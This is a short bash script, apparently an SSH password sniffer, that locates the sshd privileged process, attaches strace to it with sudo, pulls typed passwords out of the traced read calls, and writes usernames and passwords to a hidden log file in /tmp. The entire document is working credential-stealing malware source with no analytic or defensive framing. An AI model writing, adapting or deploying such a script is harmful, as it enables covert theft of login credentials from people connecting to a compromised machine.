#!/bin/bash

function find() {
	local tmp=$1
	local tmp2=$(sudo ps aux | grep "\[priv\]" | awk ' {print $12}')
	local tmp3=$2
	local tmp4=$(sudo ps aux | grep "\[priv\]" | awk ' {print $2}')
	eval $tmp="'$tmp2'"
	eval $tmp3="'$tmp4'"
}

function check() {
	local tmp=0
	local p=""
	while [ "$tmp" -eq "0" ];
	do
		for a in $(sudo cat foo | grep -a "passwd" | awk '{ print  $5 }')
		do
			if [ "$a" -eq "3" ]; then
				tmp=1
			fi
		done
	done
	tmp=0
	for a in $(sudo cat foo | grep -a "read(6, \"\\\\f\\\\0\\\\0\\\\0\\\\" | awk '{ print  $2 }')
	do
		p="$a"
	done
	ans=""
	tmp2=${p:10:1}
	if [ $tmp2 == 0 ]; then
		ans=$(echo "$p" | awk '{print substr($0, 14, length($0) - 15)}')
	else 
		ans=$(echo "$p" | awk '{print substr($0, 12, length($0) - 13)}')
	fi
	echo "Password : $ans" >>  /tmp/.log_sshtrojan1.txt
}

function listen() {
	local tmp=$2
	local tmp2=1
	local tmp3=$1
	
	tmp=tmp2
}

p=""
pr=0
pass=""
while [ -z "$p" ]
do
	find p pr
done

ok=0
ok2=0
echo "Username : $p" >>  /tmp/.log_sshtrojan1.txt
: > foo
sudo strace -p $pr 2> foo & check
echo "Done!!!"

# while [ ok == 0 ];
# do 
# 	echo "ok"
# done 